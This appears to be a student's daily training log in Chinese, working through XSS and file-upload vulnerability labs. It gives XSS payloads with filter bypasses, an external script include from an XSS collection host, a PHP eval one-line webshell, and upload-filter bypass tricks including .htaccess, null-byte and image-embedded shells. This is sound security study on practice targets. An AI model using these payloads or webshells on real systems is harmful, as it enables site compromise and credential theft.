<p>&lt;input name&#x3D;keyword value&#x3D;”xxx” 事件名称属性&#x3D;”JS代码”&gt;<br>事件名称可以是:onmouseover、onclick</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713163831433.png" alt="image-20220713163831433"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713163852786.png" alt="image-20220713163852786"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713164114310.png" alt="image-20220713164114310"></p>
<p>javascript 引入方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1);&lt;/script&gt;</span><br><span class="line">&lt;input name=keyword value=&quot;&quot; onmouseover=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;script src=https://xsspt.com/MQzNOZ&gt;&lt;/script&gt;</span><br><span class="line">&lt;a HERF=javascript:alert(1)&gt;aaa&lt;/a&gt;</span><br><span class="line">&lt;a HERF=javasc&amp;#114;ipt:alert(1)&gt;aaa&lt;/a&gt;</span><br><span class="line">&lt;svg onload=alert(1)&gt;</span><br><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="第三关："><a href="#第三关：" class="headerlink" title="第三关："></a>第三关：</h4><p>有拦截直观script，改用事件不需script</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onmouseover=&#x27;alert(1)</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713171134723.png" alt="image-20220713171134723"></p>
<h4 id="第四关："><a href="#第四关：" class="headerlink" title="第四关："></a>第四关：</h4><p>同level3，改单引号闭合为双引号闭合</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“ onmouseover=”alert(1)</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713171249990.png" alt="image-20220713171249990"></p>
<h2 id="0714第四天"><a href="#0714第四天" class="headerlink" title="0714第四天"></a>0714第四天</h2><p>今日任务：</p>
<p>1.完成XSS漏洞的学习任务</p>
<p>2.认识和理解HTTP协议攻防相关内容</p>
<p>3.掌握抓包改包工具使用</p>
<p>4.部署文件上传漏洞靶场</p>
<p>5.掌握一句话木马编写与使用</p>
<p>6.掌握文件上传漏洞的利用和绕过方式</p>
<h3 id="任务一-完成XSS漏洞的学习任务"><a href="#任务一-完成XSS漏洞的学习任务" class="headerlink" title="任务一.完成XSS漏洞的学习任务"></a>任务一.完成XSS漏洞的学习任务</h3><h4 id="第五关：-1"><a href="#第五关：-1" class="headerlink" title="第五关："></a>第五关：</h4><p>思路：发现把script和onclick也过滤了</p>
<p>改写事件关键字前面部分on，改用href不用on事件</p>
<p>尝试使用链接</p>
<p>输入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href=javascript:alert(1)&gt;aaa&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>“&gt; <a href="javascript:alert(1)">aaa</a></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220714092119166.png" alt="image-20220714092119166"></p>
<h4 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h4><p>改写href为h_ref，它先要找到然后才能改，那么我就换衣服（改变大小写）让你找不到</p>
<p>思路：输入第五关内容，发现href被变成hr_ef,将href变为大写HREF尝试</p>
<p>输入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a HREF=javascript:alert(1)&gt;aaa&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220714092627385.png" alt="image-20220714092627385"></p>
<h4 id="第七关-1"><a href="#第七关-1" class="headerlink" title="第七关"></a>第七关</h4><p>删除了href和script，它忘了删掉一层，外面一层又闭合了。</p>
<p>思路：输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>发现script被过滤</p>
<p>换成</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220714093241282.png" alt="image-20220714093241282"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;scrscriptipt&gt;alert(1);&lt;/scrscriptipt&gt;</span><br><span class="line">被过滤后结果：</span><br><span class="line">&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>它删掉内部连着的script后，外面一层又闭合了</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220714093546685.png" alt="image-20220714093546685"></p>
<h4 id="第八关-1"><a href="#第八关-1" class="headerlink" title="第八关"></a>第八关</h4><p>可以发现会把文本框内输入的内容替换到网页中已有的友情链接中</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220714094808460.png" alt="image-20220714094808460"></p>
<p>发现script被绕过</p>
<p>将其中字符实体化编码</p>
<p>输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;c&amp;#114;ipt:alert(1)</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220714094949444.png" alt="image-20220714094949444"></p>
<h4 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h4><p>先输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>试试，发现出现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>因为提示链接不合法，输入一个合法的链接：<a target="_blank" rel="noopener" href="http://baidu.com/">http://baidu.com</a></p>
<p>发现被正常加入网页中的链接中，在点击后也能进行跳转。</p>
<p>所以输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;c&amp;#114;ipt:alert(1)//http://baidu.com</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220714101525573.png" alt="image-20220714101525573"></p>
<h4 id="第十关："><a href="#第十关：" class="headerlink" title="第十关："></a>第十关：</h4><p>因为网页中没有文本框，所以注入点为url中</p>
<p>先输入’’ ‘ &gt;&lt; script onclick测试一遍，发现过滤了&lt;&gt;，并且发现有三个隐藏的input。</p>
<p>input的name分别为t_link,t_history,t_sort,</p>
<p>在url后面分别输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t_link=1，t_history=1，t_sort=1</span><br></pre></td></tr></table></figure>

<p>只有t_sort的value中被填入了值</p>
<p>所以t_sort这个输入是有效的,需要把type&#x3D;‘hidden’改掉</p>
<p>因为过滤了&lt;&gt;</p>
<p>在url中输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?t_sort=1&quot; onmouseover=&quot;alert(1)&quot; type=&quot;submit&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220714103521253.png" alt="image-20220714103521253"></p>
<h4 id="第十一关："><a href="#第十一关：" class="headerlink" title="第十一关："></a>第十一关：</h4><p>先Http头修改Refer，看看前端源码,发现四个隐藏框,且t_ref有值。</p>
<p>然后在地址栏传值试试:?keyword&#x3D;good%20job!&amp;t_link&#x3D;1&amp;t_history&#x3D;2&amp;t_sort&#x3D;3&amp;t_ref&#x3D;4</p>
<p>referer的值改为” type&#x3D;”text” onclick&#x3D;”javascript:alert(1)”&gt;&#x2F;&#x2F;出现文本框</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220714140841858.png" alt="image-20220714140841858"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220714140902177.png" alt="image-20220714140902177"></p>
<h4 id="第十二关-1"><a href="#第十二关-1" class="headerlink" title="第十二关"></a>第十二关</h4><p>先Http头修改user_agent，看看前端源码,发现四个隐藏框,且t_ua有值。</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220714141237854.png" alt="image-20220714141237854"></p>
<p>将user_agent的值改为” type&#x3D;”text” onclick&#x3D;”javascript:alert(1)”&gt;&#x2F;&#x2F;出现文本框</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220714141112503.png" alt="image-20220714141112503"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220714141219497.png" alt="image-20220714141219497"></p>
<h4 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h4><p>看看前端源码,发现四个隐藏框,且t_cook有值。想到cooki</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220714141651797.png" alt="image-20220714141651797"></p>
<p>查看当前页面cookie，发现为user&#x3D; call me maybe</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220714142542447.png" alt="image-20220714142542447"></p>
<p>将cookie改为user&#x3D;” type&#x3D;”text” onclick&#x3D;”javascript:alert(1)”&gt;&#x2F;&#x2F;</p>
<p>成功</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220714142434035.png" alt="image-20220714142434035"></p>
<h4 id="小结XSS"><a href="#小结XSS" class="headerlink" title="小结XSS"></a>小结XSS</h4><h5 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h5><p>条件满足情况下：</p>
<p>1.窃取凭证</p>
<p>2.篡改页面</p>
<p>3.构造XSS蠕虫</p>
<p>…</p>
<h5 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h5><p>大小写绕过</p>
<p>双写绕过</p>
<p>字符串html实体化编码绕过</p>
<h5 id="防护思路-1"><a href="#防护思路-1" class="headerlink" title="防护思路"></a>防护思路</h5><p>1.如果针对简单的输入框，则需要识别和转义特殊字符，包括尖括号、引号、javascript中任意字符等</p>
<p>2.针对功能复杂的富文本输入框，建议使用成熟的前端富文本输入框组件，如ueditor等</p>
<p>3.在http响应头中，为set-cookie选项额外添加http-only的值。</p>
<h3 id="任务二认识和理解HTTP协议攻防相关内容"><a href="#任务二认识和理解HTTP协议攻防相关内容" class="headerlink" title="任务二认识和理解HTTP协议攻防相关内容"></a>任务二认识和理解HTTP协议攻防相关内容</h3><h4 id="了解http协议"><a href="#了解http协议" class="headerlink" title="了解http协议"></a>了解http协议</h4><p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220714150715038.png" alt="image-20220714150715038"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220714150811162.png" alt="image-20220714150811162"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220714151328467.png" alt="image-20220714151328467"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220714151447637.png" alt="image-20220714151447637"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220714151513276.png" alt="image-20220714151513276"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220714161948276.png" alt="image-20220714161948276"></p>
<h4 id="掌握一句话木马编写和利用"><a href="#掌握一句话木马编写和利用" class="headerlink" title="掌握一句话木马编写和利用"></a>掌握一句话木马编写和利用</h4><p>shell.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_REQUEST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>url</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://HOST/shell.php?cmd=system(&#x27;calc.exe&#x27;);</span><br></pre></td></tr></table></figure>

<p>实现一句话木马弹出计算器</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220714164619705.png" alt="image-20220714164619705"></p>
<h3 id="任务三-upoad-labs"><a href="#任务三-upoad-labs" class="headerlink" title="任务三 upoad-labs"></a>任务三 upoad-labs</h3><h4 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h4><p>绕过前端限制</p>
<p>更改shell.php文件名后缀php为jpg并上传。</p>
<p>BurpSuite已经拦截请求，将HTTP报文中jpg更改为php后放开拦截</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220714170328066.png" alt="image-20220714170328066"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715152810748.png" alt="image-20220715152810748"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220714171919718.png" alt="image-20220714171919718"></p>
<h4 id="第二关-1"><a href="#第二关-1" class="headerlink" title="第二关"></a>第二关</h4><p>进行上传尝试，发现提示：文件类型不正确，请重新上传！</p>
<p>应该是文件类型Content-Type检测，BP抓包截断上传数据包，修改Content-Type为image&#x2F;jpeg，然后放行数据包，成功绕过</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220714172444465.png" alt="image-20220714172444465"></p>
<h4 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h4><h5 id="今日（20220714）作业"><a href="#今日（20220714）作业" class="headerlink" title="今日（20220714）作业"></a>今日（20220714）作业</h5><p><strong>内容：</strong>完成upload-labs第三关，确保能在上传的webshell中执行phpinfo函数。</p>
<p><strong>要求：</strong></p>
<p>1&#x2F;2 为避免内卷，规定字数上限为300字。</p>
<p>2&#x2F;2 必须要有利用成功的截屏（截屏界面中需要有自己的名字，可通过在webshell前添加echo函数实现）</p>
<p><strong>提交形式：</strong>word文档，文档名字示例：教室编号-学号-姓名，如401-202012345678-张三.docx</p>
<p><strong>提交时间：</strong>本周五（7月15日）晚间12点前</p>
<p><strong>提交流程：</strong>各组组长收齐后，统一交班级助理处转发各班级助教（401班助转发主讲老师）。</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715110312670.png" alt="image-20220715110312670"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715110703333.png" alt="image-20220715110703333"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715110720480.png" alt="image-20220715110720480"></p>
<h2 id="0715第五天"><a href="#0715第五天" class="headerlink" title="0715第五天"></a>0715第五天</h2><p>今日任务</p>
<p>1.掌握文件上传漏洞，</p>
<h3 id="任务一完成upload-labs的第四到八关"><a href="#任务一完成upload-labs的第四到八关" class="headerlink" title="任务一完成upload-labs的第四到八关"></a>任务一完成upload-labs的第四到八关</h3><h4 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h4><p>黑名单对扩展名限制不全，上传.htaccess绕过；</p>
<p>.htaccess内容为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType appliction/x-httpd-php .abc</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715100933281.png" alt="image-20220715100933281"></p>
<p>之后再用burp suit将shell.php的后缀改为.abc，变为shell.abc</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715101026769.png" alt="image-20220715101026769"></p>
<h4 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h4><p>黑名单对扩展名限制不全，利用大小写绕过</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715101300846.png" alt="image-20220715101300846"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715101322934.png" alt="image-20220715101322934"></p>
<h4 id="第六关-1"><a href="#第六关-1" class="headerlink" title="第六关"></a>第六关</h4><p>利用Windows操作系统建立文件会自动去除末尾空格的特性，在扩展名后添加空格绕过扩展名黑名单限制</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715101602624.png" alt="image-20220715101602624"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715101636483.png" alt="image-20220715101636483"></p>
<h4 id="第七关-2"><a href="#第七关-2" class="headerlink" title="第七关"></a>第七关</h4><p>l利用Windows操作系统建立文件会自动去除末尾点号的特性，在扩展名后添加点号绕过扩展名黑名单限制；</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715101919763.png" alt="image-20220715101919763"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715101847987.png" alt="image-20220715101847987"></p>
<h4 id="第八关-2"><a href="#第八关-2" class="headerlink" title="第八关"></a>第八关</h4><p>将这一关的源码同前面的做了一下对比，发现在过滤过程中少了一种操作，那就是没有对文件名去除::$DATA。所以在文件名后面加上::$DATA</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715102544841.png" alt="image-20220715102544841"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715102606873.png" alt="image-20220715102606873"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715102622565.png" alt="image-20220715102622565"></p>
<h4 id="第九关-1"><a href="#第九关-1" class="headerlink" title="第九关"></a>第九关</h4><p>漏洞在于，参数在进行层层过滤的最后没有再次使用deldot()函数来去除末尾的点。</p>
<p>所以可以构造文shell.php. . ，也就是php后面加点空格点空格，这样经过上面代码层层过滤后变为.php.，可以成功绕过黑名单，并且利用windows特性，在保存文件时会自动去除后缀名末尾的点使得apache成功解析。</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715112152242.png" alt="image-20220715112152242"></p>
<h4 id="第十关-1"><a href="#第十关-1" class="headerlink" title="第十关"></a>第十关</h4><p>源代码是将被拒绝的后缀替换为空，所以可以利用双写绕过</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715140615677.png" alt="image-20220715140615677"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715140833408.png" alt="image-20220715140833408"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715140856257.png" alt="image-20220715140856257"></p>
<h4 id="第十一关-1"><a href="#第十一关-1" class="headerlink" title="第十一关"></a>第十一关</h4><p>使用白名单，</p>
<p>思路：用截断符截断这段</p>
<p>原理：php等采用c语言编写的解析器会解析00字符，将其解析为截断功能</p>
<p>思路步骤：</p>
<p>上传文件，抓包</p>
<p>改包:将请求行中路径补充上木马文件名，并且添加%00</p>
<p>burp中将原文件拓展名改为白名单中的拓展名</p>
<p>放包</p>
<p>访问返回的shell路径，去除包含%00造成的乱码字符和后面一切字符，作为真正的shell路径</p>
<p>通过蚁剑连接shell测试是否连接成功</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715142720066.png" alt="image-20220715142720066"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715143420971.png" alt="image-20220715143420971"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715143302878.png" alt="image-20220715143302878"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715143323887.png" alt="image-20220715143323887"></p>
<h4 id="第十二关-2"><a href="#第十二关-2" class="headerlink" title="第十二关"></a>第十二关</h4><p>将十一、十二关进行比较</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715150600156.png" alt="image-20220715150600156"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/2022-07-15.png" alt="2022-07-15"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715150613313.png" alt="image-20220715150613313"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715150634877.png" alt="image-20220715150634877"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715150648939.png" alt="image-20220715150648939"></p>
<h4 id="-2"><a href="#-2" class="headerlink" title></a></h4><h4 id="利用文件包含漏洞包含webshell"><a href="#利用文件包含漏洞包含webshell" class="headerlink" title="利用文件包含漏洞包含webshell"></a>利用文件包含漏洞包含webshell</h4><p>1.了解文件包含功能</p>
<p>在根目录下新建test1.php</p>
<p>新建demo.txt</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715151811897.png" alt="image-20220715151811897"></p>
<p>在网页输入test1.php的地址，会显示demo.txt的内容</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715151603615.png" alt="image-20220715151603615"></p>
<p>当前任务：编写test1.php文件，能够从前端接收参数作为包含的文件路径。<br>编写被包含的demo.txt，其中包含一句话木马<br>访问test1.php并提供变量参数，实现执行phpinfo()；</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715152344222.png" alt="image-20220715152344222"></p>
<h4 id="第十三关-1"><a href="#第十三关-1" class="headerlink" title="第十三关"></a>第十三关</h4><p>制作包含木马的图片blankshell.jpg</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy blank.jpg /b + shell.php /a blankshell.jpg</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715154250164.png" alt="image-20220715154250164"></p>
<p>将blankshell.jpg上传</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715154348442.png" alt="image-20220715154348442"></p>
<p>右键图片在新建链接中打开图片</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715154441023.png" alt="image-20220715154441023"></p>
<p>进入包含漏洞的页面</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715154409735.png" alt="image-20220715154409735"></p>
<p>将图片地址附加在包含漏洞的页面地址上</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715154514030.png" alt="image-20220715154514030"></p>
<h4 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h4><p>与十三关一样</p>
<p>上传blankshell.jpg</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715161939691.png" alt="image-20220715161939691"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715161912670.png" alt="image-20220715161912670"></p>
<h4 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h4><p>使用的前提条件：要把虚拟机phpstudy上的php拓展的php_exif打开</p>
<p>同十三、十四关</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715162909953.png" alt="image-20220715162909953"></p>
<h4 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a>第十六关</h4><p>尝试像13-14关一样直接上传文件</p>
<p>发现不会显示姓名和phpinfo信息</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715163035361.png" alt="image-20220715163035361"></p>
<p>本关综合判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染，绕过方法：</p>
<p>上传老师发布的phpinfo()文件</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715164025760.png" alt="image-20220715164025760"></p>
